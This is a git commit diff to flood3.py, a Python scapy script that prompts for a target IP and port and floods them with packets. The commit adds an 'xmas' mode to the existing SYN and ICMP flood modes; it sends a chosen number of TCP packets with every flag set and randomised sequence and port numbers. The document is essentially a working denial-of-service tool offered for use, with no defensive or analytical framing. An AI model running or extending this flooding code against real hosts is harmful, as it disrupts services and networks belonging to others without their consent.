76b055719e87c3a2120c623c2cf4c5879b3b07e8
Emre Övünç <github@emreovunc.com>
2021-03-13 19:51:29 +0300

    Xmas attack is added by @0x00.

--- flood3.py
+++ flood3.py
@@ -1,15 +1,19 @@
 #/usr/bin/python3
 #@EmreOvunc
+#@0x00
+#Source - https://github.com/EmreOvunc/Icmp-Syn-Flood
 #pip3 install scapy
 from scapy.all import *
 
 
 def main():
-    user_input = input("Please select one of the attack type [syn, icmp]: ")
+    user_input = input("Please select one of the attack type [syn, icmp, xmas]: ")
     if user_input == "icmp":
         icmpflood()
     elif user_input == "syn":
         synflood()
+    elif user_input == "xmas":
+        xmasflood()
     else:
         print("[ERROR] Select one of the attack type !!!")
         main()
@@ -39,6 +43,20 @@ def synflood():
                                 ack=RandShort(),
                                 sport=RandShort()))
 
+def xmasflood():
+    target = destinationIP()
+    targetPort = destinationPort()
+    cycle = input("How many packets do you sent [Press enter for 100]: ")
+    if cycle == "":
+        cycle = 100
+
+    for x in range(0, int(cycle)):
+        send(IP(dst=target)/TCP(dport=targetPort,
+                                flags="FSRPAUEC",
+                                seq=RandShort(),
+                                ack=RandShort(),
+                                sport=RandShort()))
+
 
 def destinationIP():
     dstIP = input("Destination IP: ")
@@ -51,4 +69,3 @@ def destinationPort():
 
 
 main()
-
